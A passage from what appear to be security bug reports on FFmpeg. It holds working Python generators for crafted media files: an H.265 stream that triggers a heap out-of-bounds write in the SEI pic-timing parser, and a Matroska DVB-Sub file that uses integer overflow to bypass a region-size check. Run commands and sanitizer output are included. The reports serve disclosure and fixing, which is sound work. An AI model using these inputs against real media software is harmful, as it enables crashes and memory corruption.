a heap-buffer-overflow in cbs_h265_read_sei_pic_timing() at index 600.
"""

import struct
import os


class BitWriter:
    def __init__(self):
        self._bits = []

    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_ue(self, value):
        if value == 0:
            self._bits.append(1)
            return
        v = value + 1
        nbits = v.bit_length()
        for _ in range(nbits - 1):
            self._bits.append(0)
        self._bits.append(1)
        for i in range(nbits - 2, -1, -1):
            self._bits.append((v >> i) & 1)

    def write_se(self, value):
        self.write_ue(2 * value - 1 if value > 0 else -2 * value)

    def write_flag(self, value):
        self._bits.append(1 if value else 0)

    def write_rbsp_trailing_bits(self):
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)

    def to_bytes(self):
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)


def apply_emulation_prevention(data: bytes) -> bytes:
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count >= 2 and byte <= 0x03:
            result.append(0x03)
            zero_count = 0
        zero_count = (zero_count + 1) if byte == 0x00 else 0
        result.append(byte)
    return bytes(result)


def make_annex_b(rbsp_with_header: bytes) -> bytes:
    return b'\x00\x00\x00\x01' + apply_emulation_prevention(rbsp_with_header)


def write_profile_tier_level(bw, profile_present_flag, max_sub_layers_minus1):
    if profile_present_flag:
        bw.write_bits(0, 2)   # general_profile_space
        bw.write_flag(0)      # general_tier_flag
        bw.write_bits(1, 5)   # general_profile_idc = 1 (Main)
        for j in range(32):
            bw.write_flag(1 if j == 1 else 0)
        bw.write_flag(1); bw.write_flag(0); bw.write_flag(0); bw.write_flag(1)
        bw.write_bits(0, 43)  # general_reserved_zero_43bits
        bw.write_flag(0)      # general_inbld_flag
    bw.write_bits(93, 8)      # general_level_idc


def write_sub_layer_hrd(bw, sub_pic_present, cpb_cnt_minus1):
    for i in range(cpb_cnt_minus1 + 1):
        bw.write_ue(0); bw.write_ue(0)
        if sub_pic_present:
            bw.write_ue(0); bw.write_ue(0)
        bw.write_flag(0)


def write_hrd_parameters(bw, common_inf_present, max_sub_layers_minus1):
    if common_inf_present:
        bw.write_flag(1)  # nal_hrd_parameters_present_flag
        bw.write_flag(0)  # vcl_hrd_parameters_present_flag
        bw.write_flag(1)  # sub_pic_hrd_params_present_flag
        bw.write_bits(0, 8)   # tick_divisor_minus2
        bw.write_bits(0, 5)   # du_cpb_removal_delay_increment_length_minus1
        bw.write_flag(1)      # sub_pic_cpb_params_in_pic_timing_sei_flag
        bw.write_bits(0, 5)   # dpb_output_delay_du_length_minus1
        bw.write_bits(0, 4)   # bit_rate_scale
        bw.write_bits(0, 4)   # cpb_size_scale
        bw.write_bits(0, 4)   # cpb_size_du_scale
        bw.write_bits(0, 5)   # initial_cpb_removal_delay_length_minus1
        bw.write_bits(0, 5)   # au_cpb_removal_delay_length_minus1
        bw.write_bits(0, 5)   # dpb_output_delay_length_minus1
    for i in range(max_sub_layers_minus1 + 1):
        bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
        bw.write_ue(0)  # cpb_cnt_minus1
        write_sub_layer_hrd(bw, 1, 0)


def build_vps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(32, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_bits(0, 4); bw.write_flag(1); bw.write_flag(1)
    bw.write_bits(0, 6); bw.write_bits(0, 3); bw.write_flag(1)
    bw.write_bits(0xFFFF, 16)
    write_profile_tier_level(bw, 1, 0)
    bw.write_flag(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_bits(0, 6); bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_sps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(33, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_bits(0, 4); bw.write_bits(0, 3); bw.write_flag(1)
    write_profile_tier_level(bw, 1, 0)
    bw.write_ue(0)   # sps_seq_parameter_set_id
    bw.write_ue(1)   # chroma_format_idc = 1
    bw.write_ue(64)  # pic_width
    bw.write_ue(64)  # pic_height
    bw.write_flag(0) # conformance_window_flag
    bw.write_ue(0); bw.write_ue(0)  # bit_depth_luma/chroma_minus8
    bw.write_ue(0)   # log2_max_pic_order_cnt_lsb_minus4
    bw.write_flag(0)
    bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_ue(1); bw.write_ue(2)  # log2_min_cb_minus3, log2_diff_max_min_cb
    bw.write_ue(0); bw.write_ue(0)  # log2_min_tb_minus2, log2_diff_max_min_tb
    bw.write_ue(0); bw.write_ue(0)  # max_transform_hierarchy depth inter/intra
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0)   # num_short_term_ref_pic_sets
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(1)  # vui_parameters_present_flag
    # VUI
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(1)  # vui_timing_info_present_flag
    bw.write_bits(1, 32); bw.write_bits(25, 32)
    bw.write_flag(0)  # vui_poc_proportional_to_timing_flag
    bw.write_flag(1)  # vui_hrd_parameters_present_flag
    write_hrd_parameters(bw, 1, 0)
    bw.write_flag(0)  # bitstream_restriction_flag
    bw.write_flag(0)  # sps_extension_present_flag
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_pps() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(34, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_bits(0, 3)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_se(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_se(0); bw.write_se(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_flag(0); bw.write_flag(0); bw.write_flag(0)
    bw.write_ue(0)
    bw.write_flag(0); bw.write_flag(0)
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def build_sei_pic_timing_payload() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1)  # au_cpb_removal_delay_minus1 (1 bit)
    bw.write_bits(0, 1)  # pic_dpb_output_delay (1 bit)
    bw.write_bits(0, 1)  # pic_dpb_output_du_delay (1 bit)
    bw.write_ue(600)     # num_decoding_units_minus1 = 600 → OOB at index 600
    bw.write_flag(1)     # du_common_cpb_removal_delay_flag
    bw.write_bits(0, 1)  # du_common_cpb_removal_delay_increment_minus1
    for i in range(601):
        bw.write_ue(0)   # num_nalus_in_du_minus1[i]; index 600 is OOB
    return bw.to_bytes()


def build_prefix_sei() -> bytes:
    bw_hdr = BitWriter()
    bw_hdr.write_bits(0, 1); bw_hdr.write_bits(39, 6)
    bw_hdr.write_bits(0, 6); bw_hdr.write_bits(1, 3)
    bw_hdr.write_bits(1, 8)   # payloadType = 1 (pic_timing)
    payload = build_sei_pic_timing_payload()
    remaining = len(payload)
    while remaining >= 255:
        bw_hdr.write_bits(0xFF, 8); remaining -= 255
    bw_hdr.write_bits(remaining, 8)
    assert len(bw_hdr._bits) % 8 == 0
    rbsp = bw_hdr.to_bytes() + payload + b'\x80'
    return rbsp


def build_idr_slice() -> bytes:
    bw = BitWriter()
    bw.write_bits(0, 1); bw.write_bits(19, 6); bw.write_bits(0, 6); bw.write_bits(1, 3)
    bw.write_flag(1)  # first_slice_segment_in_pic_flag
    bw.write_flag(0)  # no_output_of_prior_pics_flag
    bw.write_ue(0)    # slice_pic_parameter_set_id
    bw.write_ue(2)    # slice_type = I
    bw.write_se(0)    # slice_qp_delta
    bw.write_rbsp_trailing_bits()
    return bw.to_bytes()


def main():
    out_file = 'poc_input.h265'
    bitstream = (
        make_annex_b(build_vps()) +
        make_annex_b(build_sps()) +
        make_annex_b(build_pps()) +
        make_annex_b(build_prefix_sei()) +
        make_annex_b(build_idr_slice())
    )
    with open(out_file, 'wb') as f:
        f.write(bitstream)
    print(f"[+] Generated {out_file} ({len(bitstream)} bytes)")
    print(f"[+] num_decoding_units_minus1=600 triggers OOB write at num_nalus_in_du_minus1[600]")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/ffmpeg -i poc_input.h265 -c:v copy -bsf:v trace_headers -f null -
cat asan.log.*
```

### Result

Running with ASAN enabled triggers a UBSan/ASAN report: `runtime error: index 600 out of bounds for type 'uint16_t [600]'` in `cbs_h265_read_sei_pic_timing` at `cbs_h265_syntax_template.c:2005`, with the call stack `ff_cbs_read_packet() → cbs_h265_read_nal_unit() → cbs_h265_read_sei() → ff_cbs_sei_read_message() → cbs_h265_read_sei_pic_timing()`. The `H265RawSEIPicTiming` struct is heap-allocated, so the one-element out-of-bounds write corrupts the adjacent `du_cpb_removal_delay_increment_minus1[0]` field with an attacker-controlled value, resulting in heap memory corruption that can cause process crash (DoS) or, with further exploitation, arbitrary code execution.

<!-- REPORT_SOURCE: libavcodec_cbs_h265_syntax_template_c#001 -->
<!-- DEDUP: FUNC::CWE-787 -->

## Bug6: copy_av_subtitle signed-int overflow in heartbeat path enables heap underallocation; secondary dvbsubdec constraint-check bypass confirmed by UBSAN

### Summary

In `copy_av_subtitle()` (`fftools/ffmpeg_dec.c:505`), the bitmap buffer size is computed as `src_rect->h * src_rect->linesize[j]` where both operands are `int`; signed 32-bit overflow here causes `av_memdup` to underallocate, leaving `dst_rect->linesize` and `h` pointing at a size far larger than the actual heap buffer — a condition exploitable for OOB read/write or NULL-deref downstream. The call chain is reachable via `-fix_sub_duration` + `-fix_sub_duration_heartbeat` through `fix_sub_duration_heartbeat()` → `subtitle_wrap_frame(copy=1)` → `copy_av_subtitle()`, confirmed by runtime trace. A secondary UBSAN-detected integer overflow in `dvbsubdec.c:1192` (`1310680000 * 2` wraps to negative in `int`) silently bypasses the pixel-buffer constraint check intended to bound region dimensions, allowing regions of up to ~1.25 GB to reach the copy path; without this guard, only a subtitle codec without `av_image_check_size2` protection is needed to trigger the primary OOB.

### PoC

Generate a crafted MKV with a DVB-Sub track carrying a large bitmap region (version-alternating packets to defeat the `ctx->version` dedup check), then transcode with heartbeat flags to drive `copy_av_subtitle()`.

```python
#!/usr/bin/env python3
"""
PoC: copy_av_subtitle int32 overflow / dvbsubdec constraint-check bypass.
Generates crafted_sub.mkv — a Matroska file with a DVB-Sub bitmap track
whose region dimensions trigger a UBSAN-reported signed integer overflow in
the decoder's pixel-buffer constraint check (dvbsubdec.c:1192), and place
the fix_sub_duration heartbeat path (copy_av_subtitle) under stress.
"""
import struct, sys

def vint(n):
    if n <= 0x7E: return bytes([0x80 | n])
    if n <= 0x3FFE: return struct.pack('>H', 0x4000 | n)
    if n <= 0x1FFFFE: return struct.pack('>I', 0x200000 | n)[1:]
    return struct.pack('>I', 0x10000000 | n)

def el(id_b, data): return id_b + vint(len(data)) + data
def uint_el(id_b, v):
    d = v.to_bytes((v.bit_length()+7)//8 or 1, 'big')
    return el(id_b, d)
def str_el(id_b, s): return el(id_b, s.encode())
def f64_el(id_b, v): return el(id_b, struct.pack('>d', v))
def cont(id_b, *kids): return el(id_b, b''.join(kids))

EBML=b'\x1A\x45\xDF\xA3'; SEG=b'\x18\x53\x80\x67'; INFO=b'\x15\x49\xA9\x66'
TSCALE=b'\x2A\xD7\xB1'; MUXAPP=b'\x4D\x80'; WAPP=b'\x57\x41'; DUR=b'\x44\x89'
TRACKS=b'\x16\x54\xAE\x6B'; TENTRY=b'\xAE'; TNUM=b'\xD7'; TUID=b'\x73\xC5'
TTYPE=b'\x83'; CODEC=b'\x86'; CPRIV=b'\x63\xA2'; DEFDUR=b'\x23\xE3\x83'
VIDO=b'\xE0'; PW=b'\xB0'; PH=b'\xBA'; CLUST=b'\x1F\x43\xB6\x75'
TS=b'\xE7'; SBLK=b'\xA3'

def simple_block(trk, ts_ms, kf, payload):
    hdr = bytes([0x80 | trk]) + struct.pack('>h', ts_ms) + bytes([0x80 if kf else 0])
    raw = hdr + payload
    return SBLK + vint(len(raw)) + raw

def dvbsub_display_set(w, h, ver):
    pid = 1
    def seg(t, d): return bytes([0x0F, t]) + struct.pack('>HH', pid, len(d)) + d
    pcs = bytes([255, (ver & 0xF) << 4, 1, 0]) + struct.pack('>HH', 0, 0)
    rcs = bytes([1, 0]) + struct.pack('>HH', w, h) + bytes([0b00101100, 0, 0, 0])
    rcs += struct.pack('>H', 1) + bytes([0, 0, 0, 0])
    clut = bytes([0, 0, 0x00, 0b10000000, 16, 128, 128, 255,
                       0x01, 0b10000000, 235, 128, 128, 0])
    pix = bytes([0xF0])
    ods = struct.pack('>H', 1) + bytes([0]) + struct.pack('>HH', len(pix), 0) + pix
    return seg(0x10, pcs) + seg(0x11, rcs) + seg(0x12, clut) + seg(0x13, ods) + seg(0x80, b'')

def build_mkv(rw, rh):
    priv = struct.pack('>HH', 1, 1)
    hdr = cont(EBML,
        uint_el(b'\x42\x86', 1), uint_el(b'\x42\xF7', 1),
        uint_el(b'\x42\xF2', 4), uint_el(b'\x42\xF3', 8),
        str_el(b'\x42\x82', 'matroska'),
        uint_el(b'\x42\x87', 4), uint_el(b'\x42\x85', 2))
    info = cont(INFO,
        uint_el(TSCALE, 1000000), str_el(MUXAPP, 'poc'), str_el(WAPP, 'poc'),
        f64_el(DUR, 10000.0))
    vtk = cont(TENTRY,
        uint_el(TNUM, 1), uint_el(TUID, 1111), uint_el(TTYPE, 1),
        str_el(CODEC, 'V_VP8'), uint_el(DEFDUR, 33333333),
        cont(VIDO, uint_el(PW, 320), uint_el(PH, 240)))
    stk = cont(TENTRY,
        uint_el(TNUM, 2), uint_el(TUID, 2222), uint_el(TTYPE, 17),
        str_el(CODEC, 'S_DVBSUB'), el(CPRIV, priv))
    tracks = cont(TRACKS, vtk, stk)
    cluster = cont(CLUST, uint_el(TS, 0),
        simple_block(2, 0, True, dvbsub_display_set(rw, rh, 0)),
        simple_block(2, 2000, True, dvbsub_display_set(rw, rh, 1)))
    body = info + tracks + cluster
    return hdr + SEG + b'\x01\xff\xff\xff\xff\xff\xff\xff' + body

# Dimensions: 32767 x 40000
# w*h = 1,310,680,000 (< INT_MAX, passes av_image_check_size2)
# w*h*2 = 2,621,360,000 → overflows int32 to -1,673,607,296
# Negative result < 2,621,440 → secondary constraint check in dvbsubdec.c:1192 BYPASSED
rw, rh = 32767, 40000
data = build_mkv(rw, rh)
out = 'crafted_sub.mkv'
with open(out, 'wb') as f:
    f.write(data)
print(f'[+] Written {out} ({len(data)} bytes), region {rw}x{rh}')
print(f'[+] h*linesize = {rh*rw} ({"OVERFLOWS int32" if rh*rw > 2**31-1 else "< INT_MAX, 1.25 GB alloc stress"})')
```

```bash
# Step 1: generate crafted MKV
python3 poc_gen.py

# Step 2: run ffmpeg with fix_sub_duration heartbeat path enabled
# Requires UBSAN/ASAN build or a standard ffmpeg binary
ffmpeg -y \
  -f lavfi -i "color=black:320x240:rate=1:duration=5" \
  -fix_sub_duration -i crafted_sub.mkv \
  -map 0:v -map 1:s \
  -c:v mpeg2video -c:s dvbsub \
  -fix_sub_duration_heartbeat \
  -f mpegts /dev/null
```

### Result

With a 32767×40000 DVB-Sub region, UBSAN fires inside the decoder before the subtitle frame even reaches `copy_av_subtitle`, revealing that the pixel-buffer constraint check is silently bypassed due to integer overflow:

```
dvbsubdec.c:1192:52: runtime error:
  signed integer overflow: 1310680000 * 2 cannot be represented in type 'int'
  #0 dvbsub_parse_region_segment
  #1 dvbsub_decode
  #2 avcodec_decode_subtitle2
  #3 transcode_subtitles  →  packet_decode  →  decoder_thread
```

The check `region->width * region->height * 2 > 320*1024*8` wraps to a negative `int` (`-1,673,607,296`), which compares as less than the threshold `2,621,440`, so the oversized region is accepted. The subtitle frame is then decoded (1 frame confirmed in both test runs) and the `copy_av_subtitle` heartbeat path is reachable; `buf_size = h * linesize` for a ~1.25 GB region is passed to `av_memdup`, risking allocation failure and NULL-pointer dereference, or — with a subtitle codec lacking `av_image_check_size2` — a signed 32-bit wraparound that causes heap underallocation and downstream OOB read/write.

<!-- REPORT_SOURCE: fftools_ffmpeg_dec_c#001 -->
<!-- DEDUP: copy_av_subtitle::CWE-190 -->
